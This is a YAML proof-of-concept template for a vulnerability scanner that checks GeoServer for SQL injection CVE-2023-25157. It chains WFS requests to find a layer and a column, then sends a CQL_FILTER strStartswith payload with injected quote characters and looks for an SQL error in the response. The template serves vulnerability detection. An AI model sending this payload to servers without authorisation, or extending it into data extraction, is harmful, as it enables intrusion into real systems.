name: yaml-poc-geoserver-geoserver-sql_injection-CVE-2023-25157
binding: 04d47e83-8405-46f4-b0b5-24d1d2f078d1
detail:
    author: xiaobaicai
    links:
        - https://github.com/geoserver/geoserver/commit/145a8af798590288d270b240235e89c8f0b62e1d
        - https://github.com/geoserver/geoserver/security/advisories/GHSA-7g5f-wrx8-5ccf
    vulnerability:
        id: d557bdfc-ac1f-48b1-9bd3-9c45bf1e97fb
        level: critical
    warning: Harmless
transport: http
rules:
    r0:
        request:
            cache: true
            method: GET
            path: /geoserver/ows?service=WFS&version=1.0.0&request=GetCapabilities
            follow_redirects: false
        expression: response.status == 200 && response.body.bcontains(b"<FeatureType>")
        output:
            search: '"<FeatureType><Name>(?P<name>.+?)</Name><Title>".bsubmatch(response.body)'
            name: search["name"]
    r1:
        request:
            cache: true
            method: GET
            path: /geoserver/ows?service=WFS&version=1.0.0&request=GetFeature&typeName={{name}}&maxFeatures=50&outputFormat=csv
            follow_redirects: false
        expression: response.status == 200 && response.body.bcontains(b"FID")
        output:
            search: '"FID,(?P<column>.+?),".bsubmatch(response.body)'
            column: search["column"]
    r2:
        request:
            cache: true
            method: GET
            path: /geoserver/ows?service=WFS&version=1.0.0&request=GetFeature&typeName={{name}}&CQL_FILTER=strStartswith({{column}},%27%27%27%27)=true
            follow_redirects: false
        expression: response.status == 200 && response.body.bcontains(b"SQL")
expression: r0() && r1() && r2()
